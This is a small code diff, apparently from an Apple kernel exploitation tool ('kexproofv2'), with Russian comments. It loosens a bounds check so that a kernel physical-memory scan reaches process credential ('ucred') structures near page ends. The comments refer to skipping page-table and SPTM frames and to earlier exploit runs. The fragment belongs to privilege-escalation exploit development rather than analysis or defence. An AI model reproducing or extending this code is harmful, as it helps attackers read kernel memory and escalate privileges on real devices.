@@ -8234,7 +8234,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                   useLinear ? @"LINEAR ✓" : (mapOK ? @"PAPT ✓" : @"НИ ОДИН не подтверждён — скан по LINEAR (fallback)")]);
                         if (!mapOK) { useLinear = YES; mapOK = YES; }
                     }
-                    if (uoff2 + 0x100 <= 0x4000 && mapOK) {
+                    // 2.0.16: граница 0x80 (не 0x100) — скану хватает uoff+0x78.
+                    // 2.0.15 прогон: uoff=0x3f70 → 0x100-гейт молча съел весь
+                    // SCAN-Z2 + T18-ENUM (ucred у самого конца страницы).
+                    if (uoff2 + 0x80 <= 0x4000 && mapOK) {
                         uint64_t reads = 0;
                         // kexproofv2 2.0.5: скан НАЧИНАЕМ с 1GB — нижние PA
                         // (physBase..+1GB) — это PT/TTBR/SPTM-кадры, их
